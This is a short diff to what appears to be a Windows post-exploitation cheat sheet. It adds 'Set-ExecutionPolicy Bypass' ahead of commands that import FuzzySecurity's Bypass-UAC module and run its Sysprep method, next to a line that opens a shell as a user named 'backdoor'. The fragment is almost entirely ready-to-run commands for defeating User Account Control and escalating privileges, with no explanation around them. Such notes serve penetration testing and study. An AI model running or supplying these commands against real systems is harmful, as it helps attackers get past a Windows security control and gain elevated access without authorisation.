@@ -67,6 +67,7 @@ runas /user:backdoor cmd
 **Bypassing UAC
 https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
 ```
+Set-ExecutionPolicy Bypass -Scope Process
 Import-Module .\Bypass-UAC.ps1
 Bypass-UAC -Method UacMethodSysprep
 whoami /all
